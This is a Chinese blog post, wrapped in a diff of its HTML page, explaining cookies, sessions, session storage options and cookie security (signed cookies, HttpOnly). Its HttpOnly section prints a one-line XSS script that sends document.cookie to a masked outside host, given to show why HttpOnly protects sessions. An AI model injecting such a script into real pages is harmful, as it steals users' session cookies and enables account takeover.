@@ -1,0 +1,489 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>cookie和session必知必会 | colorfulcow</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="colorfulcow">
+    
+
+    
+    <meta name="description" content="cookie和session的定义cookie是http协议的一部分，存在的原因是因为http协议是无状态的协议，对于客户端每次发出的请求,下一次请求无法得知上一次请求包含的状态数据;cookie的内容主要包括：名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cookie和session必知必会">
+<meta property="og:url" content="https://colorfulcow.github.io/2015/12/25/cookie和session必知必会/index.html">
+<meta property="og:site_name" content="colorfulcow">
+<meta property="og:description" content="cookie和session的定义cookie是http协议的一部分，存在的原因是因为http协议是无状态的协议，对于客户端每次发出的请求,下一次请求无法得知上一次请求包含的状态数据;cookie的内容主要包括：名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览">
+<meta property="og:updated_time" content="2017-05-07T06:34:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cookie和session必知必会">
+<meta name="twitter:description" content="cookie和session的定义cookie是http协议的一部分，存在的原因是因为http协议是无状态的协议，对于客户端每次发出的请求,下一次请求无法得知上一次请求包含的状态数据;cookie的内容主要包括：名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览">
+
+    
+    <link rel="alternative" href="/atom.xml" title="colorfulcow" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="colorfulcow" title="colorfulcow"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="colorfulcow">colorfulcow</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:colorfulcow.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/12/25/cookie和session必知必会/" title="cookie和session必知必会" itemprop="url">cookie和session必知必会</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="colorfulcow" target="_blank" itemprop="author">colorfulcow</a>
+		
+  <p class="article-time">
+    <time datetime="2015-12-25T13:51:45.000Z" itemprop="datePublished"> Published 2015-12-25</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie和session的定义"><span class="toc-number">1.</span> <span class="toc-text">cookie和session的定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#根据cookie和session来识别用户"><span class="toc-number">2.</span> <span class="toc-text">根据cookie和session来识别用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session的存储方式"><span class="toc-number">3.</span> <span class="toc-text">session的存储方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#session-可以存放在"><span class="toc-number">3.0.1.</span> <span class="toc-text">session 可以存放在</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#在内存中存储session"><span class="toc-number">3.1.</span> <span class="toc-text">在内存中存储session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用redis存储session"><span class="toc-number">3.2.</span> <span class="toc-text">使用redis存储session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#session信息存放在cookie中"><span class="toc-number">3.3.</span> <span class="toc-text">session信息存放在cookie中</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#数据库session"><span class="toc-number">3.4.</span> <span class="toc-text">数据库session</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie的安全性"><span class="toc-number">4.</span> <span class="toc-text">cookie的安全性</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#signedCookie"><span class="toc-number">4.1.</span> <span class="toc-text">signedCookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#httpOnly"><span class="toc-number">4.2.</span> <span class="toc-text">httpOnly</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h4 id="cookie和session的定义"><a href="#cookie和session的定义" class="headerlink" title="cookie和session的定义"></a>cookie和session的定义</h4><p>cookie是http协议的一部分，存在的原因是因为http协议是无状态的协议，对于客户端每次发出的请求,下一次请求无法得知上一次请求包含的状态数据;<br>cookie的内容主要包括：名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览器会话期的cookie被称为session cookie。session cookie一般不存储在硬盘上而是保存在内存里，当然这种行为并不是规范规定的。若设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再次打开浏览器，这些cookie仍然有效直到超过设定的过期时间。存储在硬盘上的cookie可以在不同的浏览器进程间共享，比如两个IE窗口。而对于保存在内存里的cookie，不同的浏览器有不同的处理方式。</p>
+<p>cookie虽然方便使用，但是cookie中的所有数据在客户端就可以被修改，数据容易被伪造，所以重要的数据不适合存放在cookie中,而且每次客户端发送请求都会携带着cookie,所以如果cookie中的数据字段太多会影响传输效率，为了解决这些问题就产生了session,session是保存在服务器端用于记录用户和服务器交互状态的一种数据结构。</p>
+<h4 id="根据cookie和session来识别用户"><a href="#根据cookie和session来识别用户" class="headerlink" title="根据cookie和session来识别用户"></a>根据cookie和session来识别用户</h4><p>每次HTTP请求的时候，<code>浏览器检查所有存储的cookie，如果某个cookie声明的作用范围
+大于等于将要请求的资源所在的位置，则把该cookie附在请求资源的HTTP请求头上发送给服务器。</code>实际上大多数的应用都是用 Cookie 来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，服务器就知道访问者是谁了。如果客户端的浏览器禁用了 Cookie 一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。</p>
+<h4 id="session的存储方式"><a href="#session的存储方式" class="headerlink" title="session的存储方式"></a>session的存储方式</h4><h6 id="session-可以存放在"><a href="#session-可以存放在" class="headerlink" title="session 可以存放在"></a>session 可以存放在</h6><ol>
+<li>内存</li>
+<li>cookie本身</li>
+<li>redis 或 memcached 等缓存中，</li>
+<li>数据库中；</li>
+</ol>
+<blockquote>
+<p>以上几种存储方式的利弊</p>
+</blockquote>
+<h5 id="在内存中存储session"><a href="#在内存中存储session" class="headerlink" title="在内存中存储session"></a>在内存中存储session</h5><p>在express中操作session需要使用express-session或者cookie-session等相关模块，express-session默认是使用内存来存储session，对于开发调试挺方便，但是没有其他好处</p>
+<h5 id="使用redis存储session"><a href="#使用redis存储session" class="headerlink" title="使用redis存储session"></a>使用redis存储session</h5><p>session直接存放在内存中不方便进程间共享，可以使用 redis 等缓存来存储 session。假设你的机器是 4 核的，你使用了 4 个进程在跑同一个 node web 服务，当用户访问进程1时，他被设置了一些数据当做 session 存在内存中。而下一次访问时，他被负载均衡到了进程2，则此时进程2的内存中没有他的信息，认为他是个新用户。这就会导致用户在我们服务中的状态不一致。</p>
+<h5 id="session信息存放在cookie中"><a href="#session信息存放在cookie中" class="headerlink" title="session信息存放在cookie中"></a>session信息存放在cookie中</h5><p>用 cookie session 的话，是不用担心状态共享问题的，因为 session 的 data 不是由服务器来保存，而是保存在用户浏览器端，每次用户访问时，都会主动带上他自己的信息。当然在这里，安全性之类的，只要遵照最佳实践来，也是有保证的。它的弊端是增大了数据量传输，利端是方便。</p>
+<h5 id="数据库session"><a href="#数据库session" class="headerlink" title="数据库session"></a>数据库session</h5><p>检索速度较慢</p>
+<h4 id="cookie的安全性"><a href="#cookie的安全性" class="headerlink" title="cookie的安全性"></a>cookie的安全性</h4><h5 id="signedCookie"><a href="#signedCookie" class="headerlink" title="signedCookie"></a>signedCookie</h5><p>如果一个网站用cookie来记录登陆的用户凭证，响应的cookie类似于这样：username=aaa,服务器端根据这个cookie来判定是用户aaa,那在浏览器端把username改为bbb,恰巧真的有bbb这个注册用户，那么就可以进行bbb才能做的操作了。那么类似于用户识别的数据需要存储在cookie中，并且保证不被修改的话可以在服务器端设置一个加密字符串类似于”fuiaosydfoiuyaoisduyf”,然后和username做一个sha1,这样如果cookie在浏览器端被修改，在服务器端就会发现hash校验不一致。</p>
+<h5 id="httpOnly"><a href="#httpOnly" class="headerlink" title="httpOnly"></a>httpOnly</h5><p>http是不会为了下一次连接而维护这次连接所传输的信息的。所以为了在每次会话之间传递信息，就需要用到cookie和session，为了让服务器端获得一个token来检查合法性，很多时候都是在cookie中存储一个sessionID，服务器来识别该用户，那么安全隐患也就引申而出了，只要获得这个cookie，就可以取得别人的身份，特别是管理员等高级权限帐号时，危害就大了，而XSS就是在别人的应用程序中恶意执行一段JS以窃取用户的cookie。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">'http://****?cookie='</span>+<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p>很多时候为了保证cookie的安全,可以给cookie添加HttpOnly这样一个参数，这样cookie在浏览器端就是不可见，不可修改的。对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用JS操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/HTTP/">HTTP</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://colorfulcow.github.io/2015/12/25/cookie和session必知必会/" data-title="cookie和session必知必会 | colorfulcow" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/01/21/redux数据流/" title="redux数据流">
+  <strong>上一篇：</strong><br/>
+  <span>
+  redux数据流</span>
+</a>
+</div>
+
+
+</nav>
+
+	
+
+<section id="comments" class="comment">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie和session的定义"><span class="toc-number">1.</span> <span class="toc-text">cookie和session的定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#根据cookie和session来识别用户"><span class="toc-number">2.</span> <span class="toc-text">根据cookie和session来识别用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session的存储方式"><span class="toc-number">3.</span> <span class="toc-text">session的存储方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#session-可以存放在"><span class="toc-number">3.0.1.</span> <span class="toc-text">session 可以存放在</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#在内存中存储session"><span class="toc-number">3.1.</span> <span class="toc-text">在内存中存储session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用redis存储session"><span class="toc-number">3.2.</span> <span class="toc-text">使用redis存储session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#session信息存放在cookie中"><span class="toc-number">3.3.</span> <span class="toc-text">session信息存放在cookie中</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#数据库session"><span class="toc-number">3.4.</span> <span class="toc-text">数据库session</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie的安全性"><span class="toc-number">4.</span> <span class="toc-text">cookie的安全性</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#signedCookie"><span class="toc-number">4.1.</span> <span class="toc-text">signedCookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#httpOnly"><span class="toc-number">4.2.</span> <span class="toc-text">httpOnly</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/css/" title="css">css<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/javascript基础/" title="javascript基础">javascript基础<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/redis/" title="redis">redis<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/前端框架/" title="前端框架">前端框架<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/javascript/" title="javascript">javascript<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redis/" title="redis">redis<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HTTP/" title="HTTP">HTTP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redux/" title="redux">redux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/nodejs/" title="nodejs">nodejs<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/css居中/" title="css居中">css居中<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://github.com/ColorfulCow" target="_blank" title="github">github</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017
+		
+		<a href="/about" target="_blank" title="colorfulcow">colorfulcow</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+<script type="text/javascript">
+
+var disqus_shortname = 'disqus_dYYpOsT8z2';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
